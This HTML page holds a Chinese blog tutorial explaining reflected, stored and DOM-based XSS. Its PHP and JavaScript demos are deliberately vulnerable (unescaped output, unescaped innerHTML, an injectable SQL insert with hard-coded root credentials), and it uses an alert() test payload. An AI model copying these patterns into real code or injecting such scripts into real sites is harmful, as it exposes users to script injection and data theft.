<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>xss跨脚本漏洞 | 黑色褪去，呼唤君之名</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="非持久型xss攻击：顾名思义，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。持久型xss攻击：持久型xss，会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。xss也可以分成三类：反射型：反射型XSS利用时,需要一个交互的过程,也就是说,攻击者构">
<meta property="og:type" content="article">
<meta property="og:title" content="xss跨脚本漏洞">
<meta property="og:url" content="http://yoursite.com/2018/10/19/xss跨脚本漏洞/index.html">
<meta property="og:site_name" content="黑色褪去，呼唤君之名">
<meta property="og:description" content="非持久型xss攻击：顾名思义，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。持久型xss攻击：持久型xss，会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。xss也可以分成三类：反射型：反射型XSS利用时,需要一个交互的过程,也就是说,攻击者构">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/1.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/2.jpg">
<meta property="og:image" content="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/1.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/2.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/3.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/4.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/5.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/7.jpg">
<meta property="og:image" content="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/4.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/5.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/7.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/6.jpg">
<meta property="og:image" content="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/8.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/9.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/10.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/11.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/12.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/13.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/14.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/15.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/16.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/9.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/10.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/11.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/12.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/13.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/14.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/15.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/16.jpg">
<meta property="og:image" content="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/17.jpg">
<meta property="og:image" content="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/18.jpg">
<meta property="og:image" content="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/19.jpg">
<meta property="og:image" content="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/20.jpg">
<meta property="og:image" content="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/21.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/22.jpg">
<meta property="og:image" content="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/22.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/23.jpg">
<meta property="og:image" content="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/24.jpg">
<meta property="og:image" content="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif">
<meta property="og:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/25.jpg">
<meta property="og:updated_time" content="2018-10-19T10:55:43.300Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="xss跨脚本漏洞">
<meta name="twitter:description" content="非持久型xss攻击：顾名思义，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。持久型xss攻击：持久型xss，会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。xss也可以分成三类：反射型：反射型XSS利用时,需要一个交互的过程,也就是说,攻击者构">
<meta name="twitter:image" content="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/1.jpg">
  
    <link rel="alternate" href="/atom.xml" title="黑色褪去，呼唤君之名" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <div class="outer">
        <div class="widget-wrap mobile-header">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1539771691520&amp;di=e0fc0ad09fb5dc783368f8fa3d5a109b&amp;imgtype=0&amp;src=http%3A%2F%2Fimg1.touxiang.cn%2Fuploads%2F20120916%2F16-015401_11.jpg">
    <h2 class="author">拜咯</h2>
    <h3 class="description">小小白</h3>
    <div class="count-box">
      <a href="/archives"><div><strong>5</strong><br>文章</div></a>
      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
      <a href="/tags"><div><strong>0</strong><br>标签</div></a>
    </div>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>主页</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>归档</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分类</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>标签</li>
          </a>
        
    </ul>
  </div>
</div>

        <section id="main"><article id="post-xss跨脚本漏洞" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/10/19/xss跨脚本漏洞/" class="article-date">
  <time class="post-time" datetime="2018-10-19T10:05:14.000Z" itemprop="datePublished">
    <span class="post-month">10月</span><br/>
    <span class="post-day">19</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      xss跨脚本漏洞
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
<div class="article-entry" itemprop="articleBody">
  
  	
  	
  	  <p></p><p style="margin:1.2em 0px;"><strong>非持久型xss攻击</strong>：顾名思义，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。<br><strong>持久型xss攻击</strong>：持久型xss，会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。<br>xss也可以分成三类：<br><strong>反射型</strong>：反射型XSS利用时,需要一个交互的过程,也就是说,攻击者构造的含有恶意代码的连接,需要发送给用户,然后用户点击. 经过后端，不经过数据库<br><strong>存储型</strong>：存储型XSS顾名思义,是将恶意代码,存储起来,也就是存储到我们的数据库中,当某些功能需要调用这些数据时,就会调用存储的XSS代码,从而执行恶意代码 经过后端，经过数据库<br><strong>DOM型</strong>：DOM就是指文档对象模型,这类XSS漏洞是发生在文档树的一些节点当中,其本质上同样是属于反射型XSS不经过后端，DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞，dom &#8211; xss是通过url传入参数去控制触发的。</p><p></p>
<p></p><h4 style="margin:1.3em 0px 1em;padding:0px;font-weight:bold;font-size:1.2em;">反射型xss</h4><p></p>
<p></p><p style="margin:1.2em 0px;">新建一个xss.php文件并加入以下代码：</p><p></p>
<p><pre style="font-size:1em;font-family:Consolas, Inconsolata, Courier, monospace;line-height:1.5em;margin:1.2em 0px;"><code class="hljs language-php" style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:.5em;white-space:pre;border:1px solid rgb(204,204,204);background-color:rgb(248,248,248);color:rgb(51,51,51);background:rgb(248,248,248);">\XSS反射演示<br>&lt;form action=<span class="hljs-string" style="color:rgb(221,17,68);">“”</span> method=<span class="hljs-string" style="color:rgb(221,17,68);">“get”</span>&gt;<br>    &lt;input type=<span class="hljs-string" style="color:rgb(221,17,68);">“text”</span> name=<span class="hljs-string" style="color:rgb(221,17,68);">“xss”</span>/&gt;<br>    &lt;input type=<span class="hljs-string" style="color:rgb(221,17,68);">“submit”</span> value=<span class="hljs-string" style="color:rgb(221,17,68);">“test”</span>/&gt;<br>&lt;/form&gt;<br><span class="hljs-preprocessor" style="color:rgb(153,153,153);font-weight:bold;">&lt;?php</span><br>    <span class="hljs-variable" style="color:rgb(0,128,128);">$xss</span> = @<span class="hljs-variable" style="color:rgb(0,128,128);">$_GET</span>[<span class="hljs-string" style="color:rgb(221,17,68);">‘xss’</span>];<br>    <span class="hljs-keyword" style="color:rgb(51,51,51);font-weight:bold;">if</span>(<span class="hljs-variable" style="color:rgb(0,128,128);">$xss</span>!==<span class="hljs-keyword" style="color:rgb(51,51,51);font-weight:bold;">null</span>){<br>        <span class="hljs-keyword" style="color:rgb(51,51,51);font-weight:bold;">echo</span> <span class="hljs-variable" style="color:rgb(0,128,128);">$xss</span>;<br>    }<br><span class="hljs-preprocessor" style="color:rgb(153,153,153);font-weight:bold;">?&gt;</span><br></code></pre></p>
<p></p><p style="margin:1.2em 0px;">这段代码中首先包含一个表单，用于向页面自己发送<code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);">GET</code>请求，带一个名为xss的参数。 然后PHP会读取该参数，如果不为空，则直接打印出来，这里不存在任何过滤。也就是说，如果xss中存在HTML结构性的内容，打印之后会直接解释为HTML元素。<br>部署好这个文件，访问<code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);"><a href="http://localhost/xss.php" target="_blank" rel="noopener">http://localhost/xss.php</a></code>，直接输入一个js代码，比如<code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);">&lt;script&gt;alert(‘hack’)&lt;/script&gt;</code><br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/1.jpg" alt=""><br>之后点击test：<br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/2.jpg" alt=""><br>我们输入的HTML代码被执行了。用Firebug查看，我们输出的内容直接插入到了页面中，解释为常见标签。<br><img data-original="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/3.jpg" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""><br>反射型XSS的数据流向是：<code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);">浏览器</code> -&gt; <code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);">后端</code> -&gt; <code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);">浏览器</code>。</p><p></p>
<p><noscript><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/1.jpg" alt=""><br>之后点击test：<br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/2.jpg" alt=""><br>我们输入的HTML代码被执行了。用Firebug查看，我们输出的内容直接插入到了页面中，解释为常见标签。<br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/3.jpg" alt=""><br>反射型XSS的数据流向是：<code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);">浏览器</code> -&gt; <code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);">后端</code> -&gt; <code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);">浏览器</code>。</noscript></p><p></p>
<p></p><h4 style="margin:1.3em 0px 1em;padding:0px;font-weight:bold;font-size:1.2em;">存储型xss</h4><p></p>
<p></p><p style="margin:1.2em 0px;">把xss.php内容改为下述内容（同时数据库中需要配置相应的表）：</p><p></p>
<p><pre style="font-size:1em;font-family:Consolas, Inconsolata, Courier, monospace;line-height:1.5em;margin:1.2em 0px;"><code class="hljs language-php" style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:.5em;white-space:pre;border:1px solid rgb(204,204,204);background-color:rgb(248,248,248);color:rgb(51,51,51);background:rgb(248,248,248);">\存储XSS演示<br>&lt;form action=<span class="hljs-string" style="color:rgb(221,17,68);">“”</span> method=<span class="hljs-string" style="color:rgb(221,17,68);">“post”</span>&gt;<br>    &lt;input type=<span class="hljs-string" style="color:rgb(221,17,68);">“text”</span> name=<span class="hljs-string" style="color:rgb(221,17,68);">“xss”</span>/&gt;<br>    &lt;input type=<span class="hljs-string" style="color:rgb(221,17,68);">“submit”</span> value=<span class="hljs-string" style="color:rgb(221,17,68);">“test”</span>/&gt;<br>&lt;/form&gt;<br><span class="hljs-preprocessor" style="color:rgb(153,153,153);font-weight:bold;">&lt;?php</span><br>    <span class="hljs-variable" style="color:rgb(0,128,128);">$xss</span>=@<span class="hljs-variable" style="color:rgb(0,128,128);">$_POST</span>[<span class="hljs-string" style="color:rgb(221,17,68);">‘xss’</span>];<br>    mysql_connect(<span class="hljs-string" style="color:rgb(221,17,68);">“localhost”</span>,<span class="hljs-string" style="color:rgb(221,17,68);">“root”</span>,<span class="hljs-string" style="color:rgb(221,17,68);">“123”</span>);<br>    mysql_select_db(<span class="hljs-string" style="color:rgb(221,17,68);">“xss”</span>);<br>    <span class="hljs-keyword" style="color:rgb(51,51,51);font-weight:bold;">if</span>(<span class="hljs-variable" style="color:rgb(0,128,128);">$xss</span>!==<span class="hljs-keyword" style="color:rgb(51,51,51);font-weight:bold;">null</span>){<br>        <span class="hljs-variable" style="color:rgb(0,128,128);">$sql</span>=<span class="hljs-string" style="color:rgb(221,17,68);">“insert into temp(id,payload) values(‘1’,’$xss’)”</span>;<br>        <span class="hljs-variable" style="color:rgb(0,128,128);">$result</span>=mysql_query(<span class="hljs-variable" style="color:rgb(0,128,128);">$sql</span>);<br>        <span class="hljs-keyword" style="color:rgb(51,51,51);font-weight:bold;">echo</span> <span class="hljs-variable" style="color:rgb(0,128,128);">$result</span>;<br>    }<br><span class="hljs-preprocessor" style="color:rgb(153,153,153);font-weight:bold;">?&gt;</span><br></code></pre></p>
<p></p><p style="margin:1.2em 0px;">用户输入的内容还是没有过滤，但是不直接显示在页面中，而是插入到了数据库。<br>新建show.php，内容为：</p><p></p>
<p><pre style="font-size:1em;font-family:Consolas, Inconsolata, Courier, monospace;line-height:1.5em;margin:1.2em 0px;"><code class="hljs language-php" style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:.5em;white-space:pre;border:1px solid rgb(204,204,204);background-color:rgb(248,248,248);color:rgb(51,51,51);background:rgb(248,248,248);"><span class="hljs-preprocessor" style="color:rgb(153,153,153);font-weight:bold;">&lt;?php</span><br>    mysql_connect(<span class="hljs-string" style="color:rgb(221,17,68);">“localhost”</span>,<span class="hljs-string" style="color:rgb(221,17,68);">“root”</span>,<span class="hljs-string" style="color:rgb(221,17,68);">“root”</span>);<br>    mysql_select_db(<span class="hljs-string" style="color:rgb(221,17,68);">“xss”</span>);<br>    <span class="hljs-variable" style="color:rgb(0,128,128);">$sql</span>=<span class="hljs-string" style="color:rgb(221,17,68);">“select payload from temp where id=1”</span>;<br>    <span class="hljs-variable" style="color:rgb(0,128,128);">$result</span>=mysql_query(<span class="hljs-variable" style="color:rgb(0,128,128);">$sql</span>);<br>    <span class="hljs-keyword" style="color:rgb(51,51,51);font-weight:bold;">while</span>(<span class="hljs-variable" style="color:rgb(0,128,128);">$row</span>=mysql_fetch_array(<span class="hljs-variable" style="color:rgb(0,128,128);">$result</span>)){<br>        <span class="hljs-keyword" style="color:rgb(51,51,51);font-weight:bold;">echo</span> <span class="hljs-variable" style="color:rgb(0,128,128);">$row</span>[<span class="hljs-string" style="color:rgb(221,17,68);">‘payload’</span>];<br>    }<br><span class="hljs-preprocessor" style="color:rgb(153,153,153);font-weight:bold;">?&gt;</span><br></code></pre></p>
<p></p><p style="margin:1.2em 0px;">该代码从数据库读取了之前插入的内容，并将其显示出来。<br>先创建一个数据库xss,创建temp表<br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/4.jpg" alt=""><br>然后访问xss.php，像之前一样输入HTML代码<br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/5.jpg" alt=""><br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/7.jpg" alt=""><br>点击test，点击之后却发现没有任何动静，但事实上，我们的数据已经插入到了数据库中。<br><img data-original="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/6.jpg" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""><br>当我们访问show.php查询这个值的时候，代码就会被执行。</p><p></p>
<p><noscript><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/4.jpg" alt=""><br>然后访问xss.php，像之前一样输入HTML代码<br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/5.jpg" alt=""><br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/7.jpg" alt=""><br>点击test，点击之后却发现没有任何动静，但事实上，我们的数据已经插入到了数据库中。<br><img src="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/6.jpg" alt=""><br>当我们访问show.php查询这个值的时候，代码就会被执行。</noscript></p><p></p>
<p></p><p style="margin:1.2em 0px;">存储型XSS的执行位置通常不同于输入位置。我们可以看出，存储行XSS的数据流向是：<br><code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);">浏览器</code> -&gt; <code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);">后端</code> -&gt; <code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);">数据库</code> -&gt; <code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);">后端</code> -&gt; <code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);">浏览器</code>。</p><p></p>
<p></p><h4 style="margin:1.3em 0px 1em;padding:0px;font-weight:bold;font-size:1.2em;">DOM型xss</h4><p></p>
<p></p><p style="margin:1.2em 0px;">把xss.php内容改为</p><p></p>
<p><pre style="font-size:1em;font-family:Consolas, Inconsolata, Courier, monospace;line-height:1.2em;margin:1.2em 0px;"><code class="hljs language-php" style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:.5em;white-space:pre;border:1px solid rgb(204,204,204);background-color:rgb(248,248,248);color:rgb(51,51,51);background:rgb(248,248,248);"><span class="hljs-preprocessor" style="color:rgb(153,153,153);font-weight:bold;">&lt;?php</span><br>    error_reporting(<span class="hljs-number" style="color:rgb(0,128,128);">0</span>); <span class="hljs-comment" style="color:rgb(153,153,136);font-style:italic;">//禁用错误报告  </span><br>    <span class="hljs-variable" style="color:rgb(0,128,128);">$name</span> = <span class="hljs-variable" style="color:rgb(0,128,128);">$_GET</span>[<span class="hljs-string" style="color:rgb(221,17,68);">“name”</span>];<br><span class="hljs-preprocessor" style="color:rgb(153,153,153);font-weight:bold;">?&gt;</span><br>&lt;input id=<span class="hljs-string" style="color:rgb(221,17,68);">“text”</span> type=<span class="hljs-string" style="color:rgb(221,17,68);">“text”</span> value=<span class="hljs-string" style="color:rgb(221,17,68);">“&lt;?php echo $name;?&gt;”</span> /&gt;<br>&lt;div id=<span class="hljs-string" style="color:rgb(221,17,68);">“print”</span>&gt;&lt;/div&gt;<br>&lt;script type=<span class="hljs-string" style="color:rgb(221,17,68);">“text/javascript”</span>&gt;<br>    <span class="hljs-keyword" style="color:rgb(51,51,51);font-weight:bold;">var</span> text = document.getElementById(<span class="hljs-string" style="color:rgb(221,17,68);">“text”</span>);<br>    <span class="hljs-keyword" style="color:rgb(51,51,51);font-weight:bold;">var</span> <span class="hljs-keyword" style="color:rgb(51,51,51);font-weight:bold;">print</span> = document.getElementById(<span class="hljs-string" style="color:rgb(221,17,68);">“print”</span>);<br>    <span class="hljs-keyword" style="color:rgb(51,51,51);font-weight:bold;">print</span>.innerHTML = text.value; <span class="hljs-comment" style="color:rgb(153,153,136);font-style:italic;">// 获取 text的值，并且输出在print内。这里是导致xss的主要原因。  </span><br>&lt;/script&gt;<br></code></pre></p>
<p></p><p style="margin:1.2em 0px;"><img data-original="https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%BA%94%E8%8A%82/8.jpg" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""><br>DOM-XSS 的数据流向是：<code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);">URL</code> →<code style="font-size:.85em;font-family:Consolas, Inconsolata, Courier, monospace;margin:0px .15em;padding:0px .3em;white-space:pre-wrap;border:1px solid rgb(234,234,234);background-color:rgb(248,248,248);">浏览器</code> </p><p></p>
